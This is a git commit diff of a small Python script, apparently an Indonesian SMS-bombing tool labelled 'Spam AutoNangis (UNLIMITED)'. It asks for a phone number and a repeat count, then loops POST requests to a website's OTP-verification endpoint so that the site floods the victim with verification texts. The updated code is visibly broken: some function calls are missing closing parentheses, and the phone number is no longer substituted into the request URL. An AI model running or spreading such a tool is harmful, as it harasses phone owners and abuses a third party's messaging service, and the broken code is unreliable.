2f6316fc472f73f3a7f40a66f4df9903803f27df
Ryzz_ D1P5EY <73215831+Ryzz03@users.noreply.github.com>
2020-10-23 10:15:02 +0800

    Update Kesel.py

--- Kesel.py
+++ Kesel.py
@@ -2,34 +2,31 @@
 # Hey, bro 😄
 import os, sys, json
 import requests as r
-C0 = '\033[0;36m'
-G0 = '\033[0;32m'
-W0 = '\033[0;37m'
-R0 = '\033[0;31m'
-Y0 = '\033[0;33m'
 try:
  os.system("clear")
- print = """%s
+ print
+ banner = """
  \033[1;97m
- %s==================================================%s
- %sAuthor    \033[1;91m:\033[1;96mRyzz03\033[1;97m%s
- %sWhatsApp  \033[1;91m:\033[1;96m+6282192959xxx\033[1;97m%s
- %sScript    \033[1;91m:\033[1;92mSpam AutoNangis (UNLIMITED)\033[1;97m%s
- %s==================================================%s
- """%s(G0,W0,G0,W0,G0,W0,G0,G0)
- gg = raw_input("%s[%s?%s] %sNomornya? (ex:08xxx) : "%(W0,C0,W0,W0))
- gi = int(raw_input("%s[%s?%s] %sMau ngirim berapa kak? : "%(W0,C0,W0,W0)))
+ ==================================================
+ Author    \033[1;91m:\033[1;96mRyzz03\033[1;97m
+ WhatsApp  \033[1;91m:\033[1;96m+6282192959xxx\033[1;97m
+ Script    \033[1;91m:\033[1;92mSpam AutoNangis (UNLIMITED)\033[1;97m
+ ==================================================
+ """
+ print (banner)
+ gg = raw_input("\033[1;97m[?] Nomornya? (ex:08xxx) : "
+ gi = int(raw_input("\033[1;97m[?] Mau ngirim berapa kak? : "
  c = 1
  for x in range(gi):
-  h = json.loads(r.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=%s"%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
+  h = json.loads(r.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=\033[1;97m "%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
   if h["status"] == 'success':
-   print "%s[%s%s%s] %sSuccess %sspam to %s%s"%(W0,C0,str(c),W0,G0,W0,Y0,gg)
+   print "\033[1;97m[+] BERHASIL \033[1;91mdi kirim ke"
    c += 1
   else:
-   print "%s[%s%s%s] %sFailed %sspam to %s%s"%(W0,C0,str(c),W0,R0,W0,Y0,gg)
+   print "\033[1;96m[×] GAGAL \033[1;91mdi kirim ke"
    c += 1
 # print (h)
 except r.exceptions.ConnectionError:
-   print "%s[%s!%s] %sYahh, Jaringan nya lemot :("%(W0,C0,W0,R0)
+   print "\033[1;91m[!]\033[1;96mYahh, Jaringan nya lemot :("
 except KeyboardInterrupt:
-   print "\r%s[%s-%s] %aNjirt, keluar sendiri ;( "%(W0,C0,W0,W0)
+   print "\r\033[1;91m[-]\033[1;96mNjirt, keluar sendiri ;("
